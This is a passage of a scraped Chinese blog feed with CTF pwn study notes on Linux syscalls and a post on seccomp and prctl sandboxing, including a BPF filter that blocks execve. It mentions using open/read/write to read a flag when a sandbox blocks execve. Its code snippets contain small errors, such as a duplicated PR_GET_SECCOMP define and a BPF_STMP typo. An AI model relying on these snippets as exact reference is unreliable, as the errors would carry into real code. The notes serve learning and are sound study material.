47</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">#define __NR_shutdown 48</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#define __NR_bind 49</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#define __NR_listen 50</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#define __NR_getsockname 51</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#define __NR_getpeername 52</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#define __NR_socketpair 53</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#define __NR_setsockopt 54</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#define __NR_getsockopt 55</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#define __NR_clone 56</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#define __NR_fork 57</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#define __NR_vfork 58</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#define __NR_execve 59</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#define __NR_exit 60</span></pre></td></tr></table></figure><p>完整系统调用号:<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==\">http://t.csdn.cn/drsyy</span></p>\n<h2 id=\"2寄存器传参不同上面已经说明过了\"><a class=\"anchor\" href=\"#2寄存器传参不同上面已经说明过了\">#</a> 2. 寄存器传参不同 (上面已经说明过了)</h2>\n<h2 id=\"3进行系统调用方式不同\"><a class=\"anchor\" href=\"#3进行系统调用方式不同\">#</a> 3. 进行系统调用方式不同</h2>\n<p>32 位系统通过 ** int 0x80 ** 中断进入系统调用</p>\n<p>64 位系统通过 ** syscall ** 命令进入系统调用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==\">http://t.csdn.cn/Jz6Hm</span></p>\n<h1 id=\"五-open-write-read-close的系统调用\"><a class=\"anchor\" href=\"#五-open-write-read-close的系统调用\">#</a> 五、open、write、read、close 的系统调用</h1>\n<h2 id=\"1文件描述符\"><a class=\"anchor\" href=\"#1文件描述符\">#</a> 1. 文件描述符</h2>\n<p>每一个进程都有一个与之相关的文件描述符，它们是一些小值整数，我们可以通过这些文件描述符来访问打开的文件</p>\n<p>一般地，一个程序开始运行时，会自动打开 3 个文件描述符：</p>\n<ul>\n<li>0——–标准输入 ———-stdin</li>\n<li>1——–标准输出 ———-stdout</li>\n<li>2——–标准错误 ———-stderr</li>\n</ul>\n<h2 id=\"2write系统调用\"><a class=\"anchor\" href=\"#2write系统调用\">#</a> 2.write 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>write 系统调用，是把缓存区 buf 中的前 nbytes 字节写入到与文件描述符 <code>flides有关</code> 的文件中，write 系统调用返回的是实际写入到文件中的 <code>字节数</code> 。</p>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> #标准输出流（<span class=\"token number\">1</span>），将aaa输出到屏幕上</pre></td></tr></table></figure><h2 id=\"3read系统调用\"><a class=\"anchor\" href=\"#3read系统调用\">#</a> 3.read 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>read 系统调用，是从与文件描述符 flides 相关联的文件中读取前 nbytes 字节的内容，并且写入到数据区 buf 中。read 系统调用返回的是实际读入的 <code>字节数</code></p>\n<h2 id=\"4open系统调用\"><a class=\"anchor\" href=\"#4open系统调用\">#</a> 4.open 系统调用</h2>\n<p>两种系统调用方式</p>\n<h3 id=\"第一种\"><a class=\"anchor\" href=\"#第一种\">#</a> 第一种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>将准备打开的文件或是设备的名字作为参数 path 传给函数，oflags 用来指定文件访问模式。open 系统调用成功返回一个新的文件描述符，失败返回 - 1。</p>\n<p>其中，oflags 是由必需文件访问模式和可选模式一起构成的 (通过按位或 “|”)：</p>\n<p>必需部分：</p>\n<ul>\n<li>O_RDONLY------ 以只读方式打开</li>\n<li>O_WRONLY------ 以只写方式打开</li>\n<li>O_RDWR -------- 以读写方式打开</li>\n</ul>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> f<span class=\"token operator\">=</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file.c\"</span><span class=\"token punctuation\">,</span>O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以只读方式打开文件</span></pre></td></tr></table></figure><h3 id=\"第二种\"><a class=\"anchor\" href=\"#第二种\">#</a> 第二种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">,</span> <span class=\"token class-name\">mode_t</span> mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在第一种调用方式上，加上了第三个参数 mode，主要是搭配 O_CREAT 使用，同样地，这个参数规定了属主、同组和其他人对文件的文件操作权限。</p>\n<h2 id=\"5close系统调用\"><a class=\"anchor\" href=\"#5close系统调用\">#</a> 5.close 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>终止文件描述符 flides 与其对应的文件间的联系，文件描述符被释放，可重新使用。</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "title": "沙盒机制",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>沙盒机制也就是我们常说的沙箱，英文名 <code>sandbox</code> ，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p>\n<p>在 ctf 比赛中，pwn 题中的沙盒一般都会限制 <code>execve</code>  的系统调用，这样一来 <code>one_gadget</code>  和 <code>system</code>  调用都不好使，只能采取 <code>open/read/write</code>  的组合方式来读取 flag。当然有些题目可能还会将上面三个系统调用砍掉一个，进一步限制我们获取到 flag.</p>\n<h1 id=\"1prctl函数调用\"><a class=\"anchor\" href=\"#1prctl函数调用\">#</a> 1.prctl 函数调用</h1>\n<p>prctl 是进程管理函数，沙箱规则通过 prctl 函数实现（也可以通过 seccomp 库函数实现），由它决定了哪些 <code>系统调用函数</code> 能被调用哪些不能被调用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 函数原型</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> option<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg4<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>option 选项有很多，剩下的参数也由 option 确定，这里介绍两个主要的 option<br />\n <code>PR_SET_NO_NEW_PRIVS(38)</code>  和  <code>PR_SET_SECCOMP(22)</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Get/set process seccomp mode */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>      <span class=\"token expression\"><span class=\"token number\">21</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>     <span class=\"token expression\"><span class=\"token number\">22</span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * 用 22 时一般只允许 read、write、exit、sigereturn 函数执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> * If no_new_privs is set, then operations that grant new privileges (i.e.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> * execve) will either fail or not grant them.  This affects suid/sgid,</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> * file capabilities, and LSMs.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> * Operations that merely manipulate or drop existing privileges (setresuid,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> * capset, etc.) will still work.  Drop those privileges if you want them gone.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"14\"></td><td><pre> * Changing LSM security domain is considered a new privilege.  So, for example,</pre></td></tr><tr><td data-num=\"15\"></td><td><pre> * asking selinux for a specific new context (e.g. with runcon) will result</pre></td></tr><tr><td data-num=\"16\"></td><td><pre> * in execve returning -EPERM.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> * See Documentation/userspace-api/no_new_privs.rst for more details.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_SET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">38</span></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">39</span></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// 为 38 时一般禁用 execve</span></pre></td></tr></table></figure><p>1.option 为 22 的情况 ( <code>#define PR_GET_SECCOMP     22</code> )</p>\n<ul>\n<li><code>第二个参数为1</code> ，只允许调用 <code>read/write/_exit(not exit_group)/sigreturn</code>  这几个 <code>syscall(系统调用)</code> :  <code>prctl(22,1LL,&amp;V1)</code></li>\n<li>第二个参数为 2，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则:  <code>prctl(22, 2LL, &amp;v1);</code> (第二个参数为 2 时，则会利用 <code>参数3</code>  的指向的 <code>sock_fprog结构体</code>  的成员指向的 <code>sock_filter</code>  定义的规则来进行过滤 <code>任意系统调用和系统调用参数</code> ，通过这种方式我们可以自己定义想要过滤的系统调用)</li>\n</ul>\n<p>2.option 为 38 的情况 ( <code>#define PR_SET_NO_NEW_PRIVS    38</code> )</p>\n<ul>\n<li><code>第二个参数设置为1</code> ，则禁用 execve 系统调用且可以通过 fork () 函数和 clone () 函数 <code>继承给子进程</code> :  <code>prctl(38, 1LL, 0LL, 0LL, 0LL);</code></li>\n<li><code>第二个参数设置为2</code> ，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则</li>\n</ul>\n<h2 id=\"bpf过滤规则伯克利封装包过滤\"><a class=\"anchor\" href=\"#bpf过滤规则伯克利封装包过滤\">#</a> BPF 过滤规则（伯克利封装包过滤）</h2>\n<p>上面提到的 <code>PT_SET_SECCOMP</code>  这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 <code>sock_fprog结构体</code> ，sock_fprog 结构体中，又有指向 <code>sock_filter结构体</code> 的指针 ( <code>struct sock_filter *filter; /*指向包含struct sock_filter的结构体数组指针*/</code> )，sock_filter 结构体这里，就是我们要设置 <code>规则</code> 的地方</p>\n<p>这里利用别人定义的 <code>sock_filter</code> :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stddef.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/seccomp.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/filter.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/prctl.h></span>    </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/bpf.h></span>             <span class=\"token comment\">//off 和 imm 都是有符号类型，编码信息定义在内核头文件 linux/bpf.h</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 结构体数组</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD<span class=\"token operator\">|</span>BPF_W<span class=\"token operator\">|</span>BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 从第 0 个字节开始，传送 4 个字节</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JEQ<span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 比较是否为 59（execve 的系统调用号），是就跳过下一行（进入到下面的异常处理），如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JGE<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">//        杀死一个进程</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">//        父进程追踪子进程，具体没太搞清楚</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                 <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ERRNO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">//        异常处理</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">//        这里表示系统调用如果正常，允许系统调用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> prog<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token punctuation\">.</span>len<span class=\"token operator\">=</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>sock_filter<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">.</span>filter<span class=\"token operator\">=</span>filter<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span>SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？</p>\n<pre><code>结构体数组：\n数组中的每个元素都是一个结构体\n</code></pre>\n<p>因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后 <code>赋值</code> 的 sock_filter 结构体</p>\n<p>sock_filer 结构体:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> <span class=\"token punctuation\">&#123;</span>            <span class=\"token comment\">/* Filter block */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __u16 code<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* Actual filter code,bpf 指令码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    __u8  jt;                   /* Jump true */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    __u8  jf<span class=\"token punctuation\">;</span>                   <span class=\"token comment\">/* Jump false */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    __u32 k<span class=\"token punctuation\">;</span>                    <span class=\"token comment\">/* Generic multiuse field */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//seccomp-data 结构体记录当前正在进行 bpf 规则检查的系统调用信息</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> nr<span class=\"token punctuation\">;</span><span class=\"token comment\">// 系统调用号</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    __u32 arch<span class=\"token punctuation\">;</span><span class=\"token comment\">// 调用架构</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    __u64 instruction_pointer<span class=\"token punctuation\">;</span><span class=\"token comment\">//CPU 指令指针</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    __u64 argv<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 寄存器的值，x86 下是 ebx，exc,edx,edi,ebp;x64 下是 rdi,rsi,rdx,r10,r8,r9</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</span></p>\n<h1 id=\"2seccomp库函数\"><a class=\"anchor\" href=\"#2seccomp库函数\">#</a> 2.seccomp 库函数</h1>\n<pre><code>SCMP_ACT_ALLOW(0x7fff0000U) 黑名单外的进程可以被执行（黑名单内的不能执行）\nSCMP_ACT_KILL( 0x00000000U) 白名单外的进程被杀死\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// 两个重要的宏，SCMP_ACT_ALLOW (0x7fff0000U) SCMP_ACT_KILL ( 0x00000000U)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">//seccomp_init 初始化，参数为 0 表示白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的 syscall</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 参数为 0x7fff0000U 则为黑名单模式，在名单里的会被杀死</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token 